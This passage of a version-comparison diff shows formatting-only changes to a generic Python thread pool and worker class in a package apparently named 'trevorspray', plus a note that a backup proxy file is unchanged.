-    def __init__(self, maxthreads=10, name='threadpool'):
 
+class ThreadPool:
+    def __init__(self, maxthreads=10, name="threadpool"):
         self.maxthreads = int(maxthreads)
         self.name = str(name)
         self.pool = [None] * self.maxthreads
         self.inputQueue = queue.SimpleQueue()
         self.outputQueue = queue.SimpleQueue()
         self._stop = False
 
-
     def start(self):
-
-        log.debug(f'Starting thread pool "{self.name}" with {self.maxthreads:,} threads')
+        log.debug(
+            f'Starting thread pool "{self.name}" with {self.maxthreads:,} threads'
+        )
         for i in range(self.maxthreads):
             t = ThreadWorker(pool=self, name=f"{self.name}_worker_{i + 1}")
             t.start()
             self.pool[i] = t
 
-
     def results(self, wait=False):
-
         while 1:
             result = False
             with suppress(Exception):
                 while 1:
                     yield self.outputQueue.get_nowait()
                     result = True
             if self.queuedTasks == 0 or not wait:
                 break
             if not result:
                 # sleep briefly to save CPU
-                sleep(.1)
-
+                sleep(0.1)
 
     @property
     def queuedTasks(self):
-
         queuedTasks = 0
         with suppress(Exception):
             queuedTasks += self.inputQueue.qsize()
         queuedTasks += [t.busy for t in self.pool if t is not None].count(True)
         return queuedTasks
 
-
     @property
     def finished(self):
         if self._stop:
             return True
         else:
             finishedThreads = [not t.busy for t in self.pool if t is not None]
             try:
                 inputThreadAlive = self.inputThread.is_alive()
             except AttributeError:
                 inputThreadAlive = False
-            return not inputThreadAlive and self.inputQueue.empty() and all(finishedThreads)
-
+            return (
+                not inputThreadAlive
+                and self.inputQueue.empty()
+                and all(finishedThreads)
+            )
 
     def submit(self, callback, *args, **kwargs):
-
         self.inputQueue.put((callback, args, kwargs))
 
-
     def map(self, callback, iterable, *args, **kwargs):
-
-        self.inputThread = threading.Thread(target=self.feedQueue, args=(callback, iterable, args, kwargs), daemon=True)
+        self.inputThread = threading.Thread(
+            target=self.feedQueue, args=(callback, iterable, args, kwargs), daemon=True
+        )
         self.inputThread.start()
         self.start()
-        sleep(.1)
+        sleep(0.1)
         yield from self.results(wait=True)
 
-
     def feedQueue(self, callback, iterable, args, kwargs):
-
         for i in iterable:
             if self._stop:
                 break
             self.submit(callback, i, *args, **kwargs)
 
-
     def stop(self, wait=True):
-
         results = []
 
-        log.debug(f'Shutting down thread pool with wait={wait}')
+        log.debug(f"Shutting down thread pool with wait={wait}")
         results += list(self.results(wait=wait))
 
         self._stop = True
 
         # make sure input queues are empty
         with suppress(Exception):
             while 1:
@@ -106,51 +98,47 @@
         # make sure output queues are empty
         results += list(self.results(wait=False))
         with suppress(Exception):
             self.outputQueue.close()
 
         return results
 
-
     def __enter__(self):
         return self
 
-
     def __exit__(self, exception_type, exception_value, traceback):
         self.stop(wait=False)
 
 
-
 class ThreadWorker(threading.Thread):
-
-    def __init__(self, pool, name='worker'):
-
+    def __init__(self, pool, name="worker"):
         self.pool = pool
         self.busy = False
 
         super().__init__(name=str(name), daemon=True)
 
-
     def run(self):
-
         while not self.pool._stop:
             ran = False
             self.busy = True
             try:
                 callback, args, kwargs = self.pool.inputQueue.get_nowait()
                 try:
                     self.pool.outputQueue.put(callback(*args, **kwargs))
                     ran = True
                 except Exception:
                     import traceback
-                    log.error(f'Error in thread worker {self.name}: {traceback.format_exc()}')
+
+                    log.error(
+                        f"Error in thread worker {self.name}: {traceback.format_exc()}"
+                    )
                     break
                 except KeyboardInterrupt:
                     log.error(f'Thread worker "{name}" Interrupted')
                     self.pool._stop = True
                     raise
             except queue.Empty:
                 pass
             finally:
                 self.busy = False
             if not ran:
-                sleep(.1)
+                sleep(0.1)
```

### Comparing `trevorspray-2.0.7/trevorspray/trevorproxy.py.bak` & `trevorspray-2.0.8/trevorspray/trevorproxy.py.bak`

 * *Files identical despite different names*

